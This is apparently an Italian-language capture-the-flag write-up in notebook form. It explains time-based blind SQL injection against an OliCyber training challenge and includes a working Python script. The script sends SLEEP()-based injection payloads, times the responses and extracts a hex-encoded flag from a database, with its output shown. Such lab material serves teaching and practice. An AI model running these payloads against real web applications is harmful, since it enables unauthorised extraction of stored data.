# Time-Based SQL Injection: Analisi e Sfruttamento

In alcuni scenari di attacco, l'applicazione web non restituisce alcun messaggio di errore, né mostra contenuti diversi (come nel caso del Blind SQLi basato su contenuto). In queste condizioni, l'unico canale di comunicazione che abbiamo è la **dimensione temporale**.

Se possiamo forzare il database a attendere (es. usando `SLEEP()`) solo quando una nostra condizione è vera, possiamo estrarre i dati bit per bit basandoci sul ritardo nella risposta HTTP.

In [2]:
import requests
import time
import binascii
import sys

class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        self.base_url = "{}/api/".format(host)
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + "get_token").json()
        self.token = resp["token"]

    def _do_raw_req(self, url, query):
        headers = {"X-CSRFToken": self.token}
        data = {"query": query}
        return self.sess.post(url, json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + "logic"
        return self._do_raw_req(url, query)

    def union(self, query):
        url = self.base_url + "union"
        return self._do_raw_req(url, query)

    def blind(self, query):
        url = self.base_url + "blind"
        return self._do_raw_req(url, query)

    def time(self, query):
        url = self.base_url + "time"
        return self._do_raw_req(url, query)

# Inizializziamo l'oggetto con l'URL della challenge
target_url = "http://web-17.challs.olicyber.it"
injector = Inj(target_url)
print("Classe inizializzata con successo!")

Classe inizializzata con successo!


In [3]:
def print_report(payload, response):
    """Funzione di utilità per stampare i risultati dell'API in modo leggibile."""
    print("="*60)
    print(f"[*] INPUT INVIATO:  {payload}")
    print(f"[*] QUERY ESEGUITA: {response.get('query', 'N/D')}")
    print(f"[*] RISULTATO:      {response.get('result', 'N/D')}")
    
    if response.get('sql_error'):
        print("\n[!] ERRORE SQL RILEVATO:")
        print(response['sql_error'])
    print("="*60 + "\n")

## 1. Verificare l'Oracolo Temporale
Il cuore di questo attacco è la funzione `SLEEP()`. Proviamo a testare se l'oracolo risponde in modo coerente inviando una query che causa un ritardo di 1 secondo.

In [4]:
payload = "1' AND (SELECT SLEEP(1))=1 -- -"
start = time.perf_counter()
response = injector.time(payload)
end = time.perf_counter()

print(f"Tempo misurato: {end - start:.2f}s")
print_report(payload, response)

Tempo misurato: 0.07s
[*] INPUT INVIATO:  1' AND (SELECT SLEEP(1))=1 -- -
[*] QUERY ESEGUITA: SELECT * FROM dummy WHERE sometext='1' AND (SELECT SLEEP(1))=1 -- -'
[*] RISULTATO:      No result and no error for you :)



## 2. Automazione dell'attacco
Sfruttiamo l'operatore `LIKE` combinato con `HEX()` per estrarre la flag esadecimale. Il ciclo `while` continuerà a testare i caratteri esadecimali (`0-9`, `a-f`).

**Logica dello script:**
1. **Payload**: `1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE 'risultato+c%')='1`
2. **Condizione**: Se il server impiega circa 1 secondo (o più) per rispondere, la condizione `WHERE` era **VERA**.
3. **Decodifica**: Una volta ottenuta la stringa HEX completa, usiamo `binascii` per convertirla in testo leggibile.

In [5]:
dictionary = "0123456789abcdef"
result = ""
sleep_time = 1

print("--- Avvio dell'attacco Time-Based SQL Injection ---")
while True:
    found_char_in_iteration = False
    for c in dictionary:
        # Payload: se il prefisso corrisponde, SLEEP viene eseguito
        payload = f"1' AND (SELECT SLEEP({sleep_time}) FROM flags WHERE HEX(flag) LIKE '{result+c}%')='1"
        
        start = time.perf_counter()
        injector.time(payload)
        duration = time.perf_counter() - start
        
        # Se la risposta è ritardata, abbiamo trovato il carattere
        if duration >= sleep_time:
            result += c
            print(f"\rTrovato: {result}", end="")
            sys.stdout.flush()
            found_char_in_iteration = True
            break
            
    if not found_char_in_iteration:
        break

print("\n\nEstrazione completata!")
print(f"Flag in HEX: {result}")
print(f"Flag decodificata: {binascii.unhexlify(result).decode()}")

--- Avvio dell'attacco Time-Based SQL Injection ---
Trovato: 666c61677b446f6e745f74727573375f74696d337d

Estrazione completata!
Flag in HEX: 666c61677b446f6e745f74727573375f74696d337d
Flag decodificata: flag{Dont_trus7_tim3}
